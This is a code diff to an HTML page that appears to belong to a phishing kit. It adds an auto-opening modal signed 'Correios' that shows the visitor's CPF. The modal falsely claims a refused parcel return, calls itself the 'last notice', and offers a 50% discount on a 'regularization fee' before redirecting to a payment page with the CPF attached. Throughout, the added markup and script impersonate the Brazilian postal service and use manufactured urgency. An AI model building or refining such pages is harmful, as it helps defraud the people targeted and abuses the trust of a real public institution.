@@ -13,6 +13,29 @@
         * {
             font-family: 'Roboto', sans-serif !important;
         }
+        @keyframes modalEntrada {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes bordaPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(250, 204, 21, 0.7); }
+            50% { box-shadow: 0 0 20px 10px rgba(250, 204, 21, 0.4); }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        .modal-aviso-content {
+            animation: modalEntrada 0.4s ease-out, bordaPulse 2s ease-in-out infinite;
+        }
+        .modal-aviso-content:hover {
+            animation: modalEntrada 0.4s ease-out;
+        }
+        .icone-alerta {
+            animation: shake 0.6s ease-in-out 0.5s;
+        }
         :root {
             --azul: #003366;
             --azul-escuro: #00294d;
@@ -209,6 +232,55 @@
             </div>
     </div>
 
+    <!-- Modal de Aviso com Imagem -->
+    <div id="avisoModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm"></div>
+        <div class="modal-aviso-content relative bg-white rounded-lg shadow-2xl mx-4 w-full max-w-sm border-4 border-yellow-400">
+            <div class="p-5 text-left">
+                <div class="flex justify-center mb-3">
+                    <svg class="icone-alerta w-14 h-14" viewBox="0 0 24 24" fill="none">
+                        <path d="M12 2L1 21h22L12 2z" fill="#FBBF24" stroke="#F59E0B" stroke-width="1"/>
+                        <path d="M12 9v4M12 17h.01" stroke="#000" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <p class="text-base text-gray-800 text-center leading-tight">
+                    <span class="font-bold">Produto do CPF <span id="avisoNomeProduto"></span>,</span> esse é o
+                </p>
+                <p class="text-xl font-bold text-red-500 mb-3 text-center leading-tight">ÚLTIMO AVISO.</p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Informamos que <span class="text-red-500 font-bold">realizamos uma tentativa de devolução da sua encomenda ao fornecedor</span>, contudo, a <span class="underline font-bold">devolução foi recusada.</span>
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Para auxiliá-lo na regularização do pedido e garantir a entrega no menor tempo possível, estamos oferecendo uma <span class="underline font-bold">redução de 50%</span> na taxa de regularização.
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Adicionalmente, nesta página, você poderá visualizar a <span class="italic font-bold">foto do seu pedido</span>, que se encontra atualmente na unidade de São Paulo.
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-4 text-justify leading-snug">
+                    Aproveite esta oportunidade para resolver a situação com rapidez e eficiência. Estamos à disposição para quaisquer dúvidas ou esclarecimentos.
+                </p>
+
+                <!-- Imagem do Pedido -->
+                <div class="mb-4 text-center">
+                    <img id="imagemPedido" src="https://via.placeholder.com/300x200?text=Imagem+do+Pedido" alt="Imagem do Pedido" class="w-full max-w-sm mx-auto rounded-md shadow-md">
+                </div>
+                
+                <p class="text-sm text-gray-800 text-center leading-snug mb-4">
+                    Atenciosamente,<br>
+                    <span class="font-bold">Correios</span>
+                </p>
+
+                <button id="btnResolver" class="w-full bg-cyan-700 text-white font-bold py-3 px-4 rounded-md text-sm hover:bg-cyan-800 transition-colors">
+                    Resolver
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Footer -->
         <footer class="bg-[#FFB800] mt-8 border-0 shadow-none" style="width:100vw;margin-left:calc(50% - 50vw);padding:24px 24px 28px 24px;box-shadow:none;border:0;">
             <div class="w-full px-0 py-0 border-0 shadow-none">
@@ -339,7 +411,18 @@
             // Formatar CPF para exibição (XXX.XXX.XXX-XX)
             const cpfFormatted = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             document.getElementById('cpfDisplay').textContent = cpfFormatted;
+            document.getElementById('avisoNomeProduto').textContent = cpfFormatted;
+            
+            // Mostrar o modal de aviso automaticamente
+            document.getElementById('avisoModal').classList.remove('hidden');
         }
+
+        // Evento do botão Resolver
+        document.getElementById('btnResolver').addEventListener('click', function() {
+            document.getElementById('avisoModal').classList.add('hidden');
+            // Ir para a próxima página passando o CPF
+            window.location.href = './index.html?cpf=' + encodeURIComponent(cpf);
+        });
 
             </script>
 
